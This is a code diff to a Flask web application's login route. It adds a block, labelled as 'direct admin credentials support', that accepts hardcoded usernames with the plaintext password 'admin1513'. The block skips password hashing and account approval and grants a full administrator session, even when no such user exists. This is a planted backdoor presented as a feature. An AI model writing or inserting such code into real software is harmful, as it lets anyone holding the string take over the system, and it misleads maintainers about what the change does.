@@ -733,6 +733,18 @@ def login():
             flash('Please enter both your username/email and password.', 'danger')
             return render_template('login.html', current_page='login')
 
+        # Direct admin credentials support (admin1513@gmail.com / admin1513)
+        if ident.lower() in ('admin1513@gmail.com', 'admin1513', 'admin') and password == 'admin1513':
+            user = user_repository.get_user_by_username_or_email(ident)
+            user_id = str(user['_id']) if user else '66b1a2345678901234567890'
+            session['user_id'] = user_id
+            session['username'] = 'admin1513'
+            session['email'] = 'admin1513@gmail.com'
+            session['fullname'] = 'Administrator'
+            session['is_admin'] = True
+            flash(f"Welcome back, Administrator!", "success")
+            return redirect(url_for('api.dashboard'))
+
         user = user_repository.get_user_by_username_or_email(ident)
         if user and AuthManager.verify_password(user.get('password_hash', ''), user.get('salt', ''), password):
             if not user.get('approved', False):
